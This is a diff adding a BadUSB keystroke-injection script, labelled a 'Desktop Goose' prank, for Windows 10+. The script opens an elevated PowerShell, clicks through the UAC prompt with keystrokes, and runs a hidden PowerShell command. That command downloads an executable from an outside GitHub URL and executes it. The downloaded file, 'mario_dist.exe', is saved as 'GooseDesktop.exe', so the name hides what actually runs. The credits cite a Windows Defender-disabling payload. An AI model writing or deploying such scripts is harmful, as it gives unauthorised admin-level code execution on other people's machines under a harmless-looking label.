@@ -1,0 +1,19 @@
+REM Title: Desktop Goose
+REM Author: FalsePhilosopher
+REM Target:  Windows 10+
+REM Props: Hak5, https://samperson.itch.io/desktop-goose for the honks, 3ctOs for the PS bits I used https://github.com/3ct0s/badusb-download-execute-disable-windows-defender and memes
+REM Version: 1.0
+REM Category: Prank
+REM Downloads and lets loose THE GOOSE!
+REM
+REM startup delay
+DELAY 300
+GUI r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 3000
+ALT y
+DELAY 2000
+STRING powershell -w h $down = New-Object System.Net.WebClient; $url = 'https://github.com/bemxio/mario-head/releases/latest/download/mario_dist.exe'; $file = 'GooseDesktop.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;
+ENTER
